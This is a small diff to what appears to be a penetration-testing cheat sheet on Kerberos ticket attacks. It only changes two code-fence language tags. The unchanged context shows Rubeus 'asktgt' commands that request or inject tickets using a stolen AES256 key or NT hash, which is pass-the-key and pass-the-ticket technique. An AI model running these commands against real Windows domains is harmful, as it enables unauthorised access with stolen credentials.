@@ -40,7 +40,7 @@ Spawns a new `cmd.exe` in the context of the target user with a forged TGT. From
 
 > Run on the Windows target.
 
-```
+```powershell
 Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256key> /nowrap
 ```
 
@@ -55,7 +55,7 @@ Use `/ptt` to inject the ticket directly into the current session in one step. U
 
 ### Rubeus - Direct injection
 
-```
+```powershell
 Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NThash> /ptt
 ```
 
